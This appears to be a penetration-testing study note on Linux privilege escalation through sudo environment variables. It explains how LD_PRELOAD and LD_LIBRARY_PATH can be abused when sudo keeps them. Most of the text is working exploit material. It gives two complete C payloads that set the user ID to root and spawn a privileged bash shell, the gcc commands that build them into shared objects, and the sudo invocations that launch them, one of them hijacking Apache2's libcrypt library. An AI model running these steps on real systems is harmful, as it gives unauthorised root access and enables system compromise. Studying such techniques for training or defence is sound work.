# Sudo 
Programs run through sudo can inherit env vars from the user's environment
- in the `/etc/sudoers` config file, if the env_reset option is set, sudo will run programs in a new, minimal environment
- the env_keep option can be used to keep certain variables
- configured options are displayed with `sudo -l`


**LD_PRELOAD**
- can be set to the path of a shared object (.so) file
- when set, the shared object is loaded before any others
- by creating a shared object and using an init() function, can execute code as soon as the object is loaded

- Limitations
	- will not work if the real user id is different from effective
	- sudo must be configured to preserve the LD_PRELOAD variable


**LD_PRELOAD Example**

check sudo configuration for LD_PRELOAD
![](assets/Pasted%20image%2020260531152231.png)

create the file preload.c with the following
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

compile the code into a shared object
`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
- may need to change flags (such as `-fPIC`)

run any allowed program with sudo while setting LD_PRELOAD
`sudo LD_PRELOAD=/tmp/preload.so <program>`
![](assets/Pasted%20image%2020260531152508.png)



**LD_LIBRARY_PATH**
- contains a set of directions where shared libraries are searched for first
- the `ldd` command can be used to print the shared libraries used by a program
	- `ldd /usr/sbin/apache2`
- by creating a shared library with the same name, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead
![](assets/Pasted%20image%2020260531152712.png)

Run `ldd` against Apache2
`ldd /usr/sbin/apache2`
![](assets/Pasted%20image%2020260531152747.png)
- need to pick a shared library to replace
- in this example, `libcrypt.so.1`

create the file
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

compile code
`gcc -o libcrypt.so.1 -shared -fPIC library_path.c`

run Apache2 with new library path
`sudo LD_LIBRARY_PATH=. apache2`
- can change . to whichever directory
![](assets/Pasted%20image%2020260531153037.png)